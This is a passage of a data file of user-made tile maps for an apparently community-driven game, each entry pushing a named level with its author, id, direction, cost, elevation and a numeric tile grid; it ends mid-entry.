maps.push({name="NN",author="Escalope",id="#1672440098",direction="forward",cost=175,elevation=0,map=[0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,100,5,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,5,94,5,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,5,93,5,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0]});
maps.push({name="O",author="Escalope",id="#1672440123",direction="left",cost=229,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,5,100,5,5,5,5,5,5,5,5,5,5,5,5,5,5,94,5,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,2,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,93,5,0,2,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="P",author="Escalope",id="#1672440146",direction="left",cost=201,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,5,93,5,5,5,5,5,5,5,5,5,5,5,5,5,5,94,5,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,2,5,5,5,5,5,5,5,5,5,100,5,0,0,0,0,0,0,0,0,2,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Q",author="Escalope",id="#1672440166",direction="left",cost=231,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,94,5,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,5,5,5,5,0,0,0,0,0,0,5,5,0,0,5,5,5,5,0,0,5,5,5,5,0,0,0,0,0,0,5,93,5,0,5,5,5,5,0,0,5,5,5,5,0,0,0,0,0,0,0,5,5,5,5,5,5,5,0,0,5,5,5,5,0,0,0,0,0,0,0,0,5,5,5,5,5,0,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,2,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,5,100,5,0,2,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="R",author="Escalope",id="#1672440186",direction="left",cost=192,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,94,5,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,5,5,5,0,0,0,0,0,5,5,5,0,0,0,0,0,0,0,0,0,5,5,5,0,0,0,0,0,5,5,5,0,0,0,0,0,0,0,0,0,5,5,5,0,0,0,0,0,5,5,5,0,0,0,0,0,0,0,0,0,5,5,5,0,0,0,0,0,5,5,5,0,0,0,0,0,0,0,0,0,5,5,5,0,0,0,0,0,5,5,5,0,0,0,0,0,0,0,0,0,5,5,5,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,5,5,5,0,0,0,0,0,5,5,5,5,5,0,0,0,0,0,0,0,5,5,5,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,5,5,5,0,0,0,0,0,5,5,5,5,5,5,5,0,0,0,0,0,5,5,5,0,0,0,0,0,5,5,5,0,5,5,5,5,0,0,0,0,5,5,5,0,0,0,0,0,5,5,5,0,0,5,5,5,5,0,0,0,5,5,5,0,0,0,0,0,5,5,5,0,0,0,5,5,100,5,0,0,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,5,93,5,0,2,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,5,5,0,2,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="S",author="Escalope",id="#1672440211",direction="left",cost=245,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,5,5,5,5,5,5,5,5,5,5,5,0,0,0,5,5,5,5,0,0,5,5,5,5,5,5,5,5,5,93,5,0,0,0,5,5,94,5,0,0,5,5,5,5,5,5,5,5,5,5,5,0,0,0,5,5,5,5,0,0,5,5,5,5,5,5,5,5,5,5,5,0,0,0,5,5,5,5,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,5,5,5,5,0,0,0,5,5,5,5,5,5,5,5,5,5,5,0,0,5,5,5,5,0,0,0,5,5,5,5,5,5,5,5,5,5,5,0,2,5,5,100,5,0,0,0,5,5,5,5,5,5,5,5,5,5,5,0,2,5,5,5,5,0,0,0,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="V",author="Escalope",id="#1672440234",direction="left",cost=145,elevation=0,map=[0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,94,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,93,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,100,5,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,2,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,2,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="W",author="Escalope",id="#1672440259",direction="left",cost=145,elevation=0,map=[0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,5,94,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,93,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,100,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,0,0,0,5,5,0,0,0,0,0,0,0,5,5,5,5,5,5,5,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,2,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,2,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="X",author="Escalope",id="#1672440294",direction="left",cost=157,elevation=0,map=[0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,5,94,5,5,0,0,0,0,0,0,0,0,0,0,5,5,100,5,0,0,5,5,5,5,5,0,0,0,0,0,0,0,0,5,5,5,5,5,0,0,0,5,5,5,5,5,0,0,0,0,0,0,5,5,5,5,5,0,0,0,0,0,5,5,5,5,5,0,0,0,0,5,5,5,5,5,0,0,0,0,0,0,0,5,5,5,5,5,0,0,5,5,5,5,5,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,5,5,5,5,5,0,0,5,5,5,5,5,0,0,0,0,0,0,0,5,5,5,5,5,0,0,0,0,5,5,5,5,5,0,0,0,0,0,5,5,5,5,5,0,0,0,0,0,0,5,5,5,5,5,0,0,0,5,5,5,5,5,0,0,0,0,0,0,0,0,5,5,5,5,5,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,5,5,93,5,0,2,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,2,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Y",author="Escalope",id="#1672440313",direction="left",cost=117,elevation=0,map=[0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,94,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,100,5,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,93,5,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Z",author="Escalope",id="#1672440334",direction="right",cost=185,elevation=0,map=[0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,5,5,94,5,0,0,0,0,0,0,0,0,0,0,5,5,100,5,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,5,5,5,5,5,0,0,5,5,5,5,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,5,5,5,5,0,0,0,0,0,0,0,5,5,5,5,5,5,5,0,0,5,5,5,5,0,0,0,0,0,0,5,5,5,5,5,5,5,5,0,0,5,5,5,5,0,0,0,0,0,5,5,5,5,0,5,5,5,5,0,0,5,5,5,5,0,0,0,0,5,5,5,5,0,0,5,5,5,5,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,0,5,5,5,5,0,0,5,5,5,5,0,0,5,5,5,5,0,0,0,0,5,5,5,5,0,0,5,5,5,5,0,5,5,5,5,0,0,0,0,0,5,5,5,5,0,0,5,5,5,5,5,5,5,5,0,0,0,0,0,0,5,5,5,5,0,0,5,5,5,5,5,5,5,0,0,0,0,0,0,0,5,5,5,5,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,5,5,5,5,0,0,5,5,5,5,5,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,5,5,5,5,2,0,5,5,93,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Funny Runner",author="ZpLit",id="#1672453601",direction="forward",cost=412,elevation=4,map=[5,5,5,5,5,5,5,5,5,2,2,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,127,5,5,5,5,127,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,15,49,15,5,5,5,15,49,15,5,5,15,49,15,5,5,5,15,49,15,49,49,49,9,9,9,49,49,9998,96,96,9998,49,49,9,9,9,49,49,49,15,49,15,5,5,5,15,49,15,45,45,15,49,15,5,5,5,15,49,15,5,9,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,9,5,5,9,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,9,5,5,9,9,5,5,5,5,5,5,5,5,5,5,5,5,5,5,9,9,5,5,9998,8,5,5,5,5,5,5,5,5,5,5,5,5,5,5,8,9998,5,5,9,7,5,5,5,1,1,1,95,95,1,1,1,5,5,5,7,9,5,5,9,6,9998,5,5,1,6,5,5,5,5,6,1,5,5,9998,6,9,5,5,9,5,5,5,5,1,7,5,5,5,5,7,1,5,5,5,5,9,5,15,49,15,5,5,5,1,8,5,5,5,5,8,1,5,5,5,15,49,15,49,49,49,9,9,9,109,9,9,9,9,9,9,109,9,9,9,49,49,49,15,49,15,5,5,5,1,1,1,2,2,1,1,1,5,5,5,15,49,15]});
maps.push({name="Drinking Water",author="Djinnz",id="#1672460984",direction="forward",cost=404,elevation=8,map=[1,1,1,1,1,1,1,1,1,2,2,1,1,1,1,1,1,1,1,1,1,132,7,7,7,7,7,94,1,6,6,1,94,7,7,7,7,7,132,1,7,7,7,7,7,7,7,7,1,131,131,1,7,7,7,7,7,7,7,7,9,9,9,9,9,9,9,9,1,1,1,1,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,1,1,9,9,9,9,9,9,9,9,9,0,0,0,0,0,0,0,0,0,1,1,148,148,148,148,148,148,148,148,148,0,0,0,0,0,0,0,0,0,1,1,13,13,13,13,13,13,13,13,13,9,9,9,9,9,9,9,9,9,1,1,13,13,13,13,13,13,13,13,13,9,9,9,9,9,9,9,9,9,1,1,0,0,0,135,135,135,0,0,0,11,11,11,11,11,11,11,11,11,1,1,0,0,0,135,135,135,0,0,0,11,11,11,11,11,11,11,11,11,1,1,0,0,0,135,135,135,0,0,0,13,13,13,13,13,13,13,13,13,1,1,0,0,0,135,135,135,0,0,0,13,13,13,13,13,13,13,13,13,1,1,0,0,0,135,135,135,0,0,0,13,13,13,13,13,13,13,13,13,1,1,0,0,0,13,13,13,0,0,0,13,13,13,13,13,13,13,13,13,1,1,13,13,13,13,13,13,13,13,13,13,13,13,13,13,13,13,13,13,1,1,13,13,13,13,13,13,13,13,13,140,13,13,13,13,13,13,13,13,1,1,13,13,13,13,13,13,13,13,125,21,13,13,13,13,13,13,13,13,1,1,13,13,13,13,13,13,13,13,21,97,21,93,21,93,21,13,13,13,1,1,13,13,13,21,93,21,93,21,97,1,1,1,1,1,1,1,1,96,2,2,96,1,1,1,1,1,1,1,1]});
maps.push({name="Paimon",author="NekoAndRew",id="#1672463886",direction="forward",cost=442,elevation=0,map=[1,1,1,1,1,1,1,0,2,2,0,0,1,0,0,0,0,0,0,0,1,1,1,1,1,1,0,0,22,24,22,0,0,0,22,22,22,22,0,0,1,1,1,1,1,0,0,22,24,24,22,22,22,22,24,24,24,22,22,0,1,1,1,1,0,0,22,24,24,24,24,24,24,24,24,24,22,22,22,94,1,1,0,0,0,22,24,24,24,24,24,24,24,24,24,24,24,24,22,73,1,0,0,4,22,24,24,24,24,24,24,24,22,22,22,24,24,24,22,73,1,0,4,0,22,24,24,24,24,24,22,73,64,75,75,22,22,24,22,73,1,0,4,0,22,24,24,24,24,22,64,73,73,65,75,64,73,22,22,73,1,0,4,0,22,24,24,24,22,64,64,73,73,65,64,64,73,73,22,73,0,0,4,0,22,24,24,24,24,22,22,64,64,64,64,64,75,73,73,73,0,4,4,4,22,24,24,24,24,24,24,22,64,64,64,64,75,73,73,73,93,4,4,4,4,24,24,24,24,24,24,24,22,64,64,64,75,73,73,73,0,0,4,0,22,24,24,22,22,22,22,22,22,64,64,64,73,73,73,94,1,0,4,0,22,24,24,24,22,64,64,73,73,65,64,64,73,73,73,22,1,0,4,0,22,24,24,24,24,22,64,73,73,65,75,64,73,22,73,22,1,0,0,4,22,24,24,24,24,24,22,73,64,75,75,64,22,24,22,22,1,1,0,0,0,22,24,24,24,24,24,22,22,22,22,22,24,24,22,22,1,1,1,1,0,0,22,24,24,24,24,24,24,24,24,24,24,22,22,0,1,1,1,1,1,0,0,22,24,22,22,22,22,22,22,22,22,22,0,0,1,1,1,1,1,1,0,2,2,0,22,22,0,0,0,0,0,0,0,0]});
maps.push({name="Bumper Tiles",author="sivi",id="#1672509384",direction="forward",cost=418,elevation=5,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,2,2,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9998,90,14,14,90,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,94,14,14,14,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,94,14,14,14,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9998,90,14,14,90,19,0,0,19,19,19,19,19,19,19,19,19,19,19,19,19,19,14,14,14,19,0,0,19,16,16,16,16,16,16,16,16,16,16,16,16,19,14,14,14,19,19,19,19,0,92,0,92,0,92,0,92,0,92,0,0,19,90,14,90,19,19,90,14,65,65,65,65,65,65,65,65,65,65,65,65,5,14,14,14,19,19,14,14,135,135,135,135,135,135,135,135,135,135,135,135,3,14,14,14,19,19,14,14,65,65,65,65,65,65,65,65,65,65,65,65,5,14,14,14,19,19,14,19,0,0,92,0,92,0,92,0,92,0,92,0,19,90,14,90,19,19,14,19,16,16,16,16,16,16,16,16,16,16,16,16,19,14,14,14,19,9998,3,9998,19,19,19,19,19,19,19,19,19,19,19,19,1,95,95,95,1,1,119,1,1,1,1,1,1,199,199,199,199,199,1,1,1,114,114,114,1,1,119,119,119,119,93,199,90,119,119,119,119,119,132,90,90,14,14,14,1,1,90,119,119,119,93,199,119,119,119,119,119,119,119,119,141,14,14,88,1,1,131,119,119,119,93,199,119,119,119,119,119,119,119,119,141,14,14,14,1,1,90,119,119,119,93,199,90,119,119,119,119,119,119,90,90,14,14,90,1,1,1,1,1,1,1,1,1,1,1,2,2,1,1,1,1,1,1,1,1]});
maps.push({name="Hutao",author="NekoAndRew",id="#1672519820",direction="forward",cost=350,elevation=0,map=[0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,2,2,105,93,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,105,105,105,105,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,105,105,105,105,0,0,0,0,76,76,76,76,0,0,1,1,0,105,105,105,105,105,105,0,0,0,0,0,76,36,76,1,1,1,1,1,105,105,105,105,105,105,0,0,0,0,105,0,76,76,1,1,1,1,1,1,105,105,105,105,105,0,0,0,0,105,105,0,0,1,1,1,1,1,1,1,105,105,105,105,105,105,0,0,199,199,199,0,1,1,1,1,1,1,1,1,105,105,105,64,64,105,105,199,199,199,199,0,1,1,1,1,1,1,1,1,105,105,105,105,105,105,105,76,199,199,199,0,1,1,1,1,1,1,1,1,105,105,105,64,75,75,105,105,76,199,199,0,1,1,1,1,1,1,1,1,105,64,1,1,76,75,64,105,105,105,199,0,1,1,1,1,1,1,1,1,64,64,1,1,76,64,64,76,105,105,105,0,1,1,1,1,1,1,1,1,64,64,1,64,64,64,64,76,76,199,199,0,1,1,1,1,1,1,1,1,105,64,64,64,64,64,64,0,105,105,105,0,1,1,1,1,1,1,1,105,105,105,105,105,64,64,64,105,0,0,105,0,0,39,39,39,39,1,1,105,105,105,105,64,64,64,64,105,0,0,199,39,39,39,1,1,39,1,1,105,105,64,1,1,76,75,105,0,105,0,0,39,39,1,39,39,39,1,1,105,105,105,1,105,105,105,105,105,105,105,0,0,0,1,1,1,1,1,1,105,105,105,105,0,0,0,105,105,105,105,105,0,0,0,0,0,0,1,1,0,93,0,0,0,0,0,0,0,2,2,0]});
maps.push({name="Black Lion",author="ZpLit",id="#1672762552",direction="left",cost=502,elevation=0,map=[0,0,0,0,11,11,1,1,1,1,1,1,1,1,1,1,2,2,1,1,0,0,0,11,45,45,105,105,105,105,105,105,105,105,105,105,105,105,45,1,0,0,0,11,45,105,66,66,66,66,66,66,66,66,66,66,66,66,105,1,0,0,0,11,45,105,66,66,66,66,66,66,66,66,66,66,66,66,105,1,0,0,0,11,45,105,66,66,66,66,66,66,66,66,66,66,66,66,105,1,0,0,0,11,45,105,66,66,66,66,66,66,66,66,66,66,128,5,105,1,0,0,0,11,45,105,66,66,66,66,66,66,66,66,66,66,66,66,105,1,0,0,0,11,45,105,66,66,66,66,66,66,66,66,66,66,66,66,105,1,0,0,0,11,45,105,66,66,66,66,66,66,66,66,66,66,66,66,105,1,0,0,0,11,45,45,105,105,105,105,105,68,105,105,105,105,105,105,45,11,0,11,11,11,45,45,45,45,45,45,105,68,105,45,45,45,45,45,45,11,11,45,45,45,45,45,11,11,11,11,11,69,11,11,45,45,45,45,45,11,11,45,45,45,45,45,11,45,45,45,45,68,45,11,45,45,45,45,45,11,11,45,45,45,45,45,45,45,66,66,66,66,45,11,45,66,66,66,45,11,11,75,11,11,11,11,11,45,66,66,66,66,45,11,45,66,66,66,45,11,11,75,11,45,93,45,11,45,66,66,66,66,45,11,45,66,66,66,45,11,11,75,11,45,11,45,11,45,66,66,66,66,45,11,45,66,66,66,45,11,2,45,45,45,45,45,90,45,66,66,66,66,68,69,68,66,66,66,45,11,2,45,45,45,45,45,90,45,45,45,45,45,45,11,45,45,45,45,45,11,11,11,11,11,11,11,11,11,11,11,11,11,11,0,11,11,11,11,11,0]});
maps.push({name="Crevice",author="ZpLit",id="#1672785608",direction="forward",cost=358,elevation=0,map=[0,1,1,1,1,1,1,0,1,2,2,1,0,0,0,0,0,0,0,0,1,15,15,15,15,15,15,1,1,15,15,1,0,0,0,0,0,0,0,0,1,15,15,15,15,15,15,15,15,15,15,1,0,0,0,0,0,0,0,0,0,4,15,15,15,15,15,15,15,15,15,15,1,1,0,0,0,0,0,0,0,5,6,15,15,15,15,15,15,15,15,15,15,15,1,1,1,0,0,0,0,5,5,5,5,6,7,15,15,15,15,15,15,15,15,15,15,1,0,0,0,5,5,6,6,6,7,6,7,15,15,15,15,15,15,15,15,15,1,0,1,15,15,7,7,6,6,5,6,6,15,15,15,15,15,15,15,15,15,1,1,15,15,15,15,5,5,5,6,5,185,185,185,5,15,15,15,15,15,1,1,15,15,15,15,15,15,5,5,5,185,185,185,5,5,5,5,15,15,1,0,1,1,15,15,15,15,15,15,5,185,185,185,5,5,5,5,5,15,1,0,0,0,1,1,15,15,15,15,15,15,15,15,6,6,6,6,5,5,0,0,0,0,0,0,1,15,15,15,15,15,15,15,15,15,6,6,6,5,0,0,0,1,1,1,15,